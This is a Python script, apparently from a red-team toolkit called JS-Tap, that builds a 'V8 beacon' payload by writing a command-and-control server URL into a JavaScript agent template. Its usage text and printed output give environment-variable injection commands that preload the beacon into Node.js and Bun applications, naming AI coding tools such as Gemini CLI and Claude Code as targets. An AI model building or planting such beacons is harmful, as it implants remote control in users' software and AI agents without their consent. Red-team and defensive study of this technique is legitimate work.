#!/usr/bin/env python3
"""
V8 Beacon Builder — Generates a ready-to-use V8 beacon payload for Node.js apps.

Reads the v8-agent.js template, replaces configuration placeholders, and outputs
a self-contained beacon script that can be injected into Node.js or Bun runtimes.

Usage:
    python3 v8ize.py --server https://10.0.0.1:8444 --tag myapp
    python3 v8ize.py --server https://10.0.0.1:8444 --tag claude --output /tmp/v8-beacon.js

Then inject into any Node.js or Bun application:
    export NODE_OPTIONS="--require /path/to/v8-beacon.js"     # Node.js apps (Gemini CLI, etc.)
    export BUN_OPTIONS="--preload /path/to/v8-beacon.js"      # Bun apps (Claude Code, etc.)
    node some-app.js
"""

import argparse
import os
import sys


# When frozen by PyInstaller, bundled data files are extracted to sys._MEIPASS
if getattr(sys, 'frozen', False):
    SCRIPT_DIR = sys._MEIPASS
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.join(SCRIPT_DIR, 'payload')


def build_beacon(server_url, tag, output_path=None):
    """Build a ready-to-use V8 beacon payload.

    Args:
        server_url: C2 server URL (e.g., https://10.0.0.1:8444)
        tag: Client tag for identification
        output_path: Output file path (default: v8-beacon.js in current directory)

    Returns:
        str: Path to the generated beacon file.
    """
    agent_path = os.path.join(PAYLOAD_DIR, 'v8-agent.js')

    if not os.path.isfile(agent_path):
        print(f"  Error: Payload template not found: {agent_path}")
        sys.exit(1)

    with open(agent_path, 'r') as f:
        agent_code = f.read()

    # Replace template variables
    agent_code = agent_code.replace("'__V8_SERVER_URL__'", f"'{server_url}'")
    agent_code = agent_code.replace("'__V8_TAG__'", f"'{tag}'")

    # Determine output path
    if not output_path:
        output_path = os.path.join(os.getcwd(), 'v8-beacon.js')

    with open(output_path, 'w') as f:
        f.write(agent_code)

    return output_path


def main():
    parser = argparse.ArgumentParser(
        description='V8 Beacon Builder — Generate Node.js beacon payloads for JS-Tap',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Generate a beacon:
    python3 v8ize.py --server https://10.0.0.1:8444 --tag claude

  Generate with custom output path:
    python3 v8ize.py --server https://10.0.0.1:8444 --tag gemini --output /tmp/v8-beacon.js

  Inject into a Node.js application:
    export NODE_OPTIONS="--require /path/to/v8-beacon.js"
    gemini                    # Gemini CLI
    node app.js               # Any Node.js app

  Inject into a Bun application:
    export BUN_OPTIONS="--preload /path/to/v8-beacon.js"
    claude                    # Claude Code (Bun-based)
        """
    )

    parser.add_argument('--server', required=True, help='C2 server URL (e.g., https://10.0.0.1:8444)')
    parser.add_argument('--tag', default='v8', help='Client tag (default: v8)')
    parser.add_argument('--output', help='Output file path (default: ./v8-beacon.js)')

    args = parser.parse_args()

    print()
    print("  V8 Beacon Builder")
    print("  =================")
    print()
    print(f"  Server: {args.server}")
    print(f"  Tag:    {args.tag}")
    print()

    output_path = build_beacon(args.server, args.tag, args.output)

    abs_path = os.path.abspath(output_path)

    print(f"  [+] Generated: {output_path}")
    print()
    print("  Usage (Node.js apps — Gemini CLI, etc.):")
    print(f'    export NODE_OPTIONS="--require {abs_path}"')
    print()
    print("  Usage (Bun apps — Claude Code, etc.):")
    print(f'    export BUN_OPTIONS="--preload {abs_path}"')
    print()
    print("  Then run the target application normally:")
    print("    gemini            # Gemini CLI (Node.js)")
    print("    claude            # Claude Code (Bun)")
    print("    node app.js       # Any Node.js app")
    print()


if __name__ == '__main__':
    main()
